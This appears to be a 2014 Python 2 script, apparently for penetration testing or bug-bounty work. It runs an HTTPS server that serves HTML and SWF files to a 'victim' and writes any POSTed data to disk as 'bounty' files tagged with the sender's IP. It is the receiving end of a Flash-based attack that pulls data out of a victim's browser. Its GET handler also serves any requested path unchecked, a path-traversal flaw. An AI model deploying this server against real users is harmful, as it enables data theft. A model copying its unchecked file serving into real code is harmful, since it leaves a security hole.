#!/usr/bin/python

######################################################################
# Author:  Seth Art (sethsec@gmail.com, @sethsec)                    #
# Version: 0.9.1                                                     #
# Date:    10.10.2014                                                #
# Purpose: Very basic web server that answers GET and POST requests  #
#          The server is designed to serve an html and swf file to   #
#          a victim, and will save any data that comes via POST body #
#          to a file on disk.                                        #
#                                                                    #
######################################################################

import ssl
import time
import BaseHTTPServer
import cgi
from urlparse import parse_qsl
from BaseHTTPServer import BaseHTTPRequestHandler
import os

PORT_NUMBER = 443 # Change this if you are already running an SSL server on port 443 
VERSION = "0.9.1"


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(s):
        """Respond to a GET request."""
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        spath = s.path.lstrip('/')
        with open (spath, 'r') as file:
            s.wfile.writelines(file)

    def do_POST(s):
        """Save data from ANY POST request to a file on disk"""
        length = int(s.headers['content-length'])
        postvars =  parse_qsl(s.rfile.read(length), keep_blank_values=1)
        clientIP = s.client_address[0]
        timestamp = time.time()
        filename = 'bounty-%s-%s.txt' % (clientIP,timestamp)
        with open('../bounty/%s' % filename, 'w') as txt:
            txt.writelines(postvars[0])
        print
        print "*  New bounty file written to disk: %s/bounty/%s  " % (curpath,filename)
        print
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()



if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    curpath = os.getcwd()
    os.chdir('%s/webroot' % curpath)
    httpd = server_class(('', PORT_NUMBER), MyHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='/root/localhost.pem', server_side=True)
    print
    print 
    print "      [SWF-Server] Listening on %s/tcp" % (PORT_NUMBER)
    print "      [SWF-Server] Document Root: %s" % (os.getcwd())
    print "      [SWF-Server] Use <Ctrl-C> to stop"
    print
    print 
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print time.asctime(), "Server Stopped"

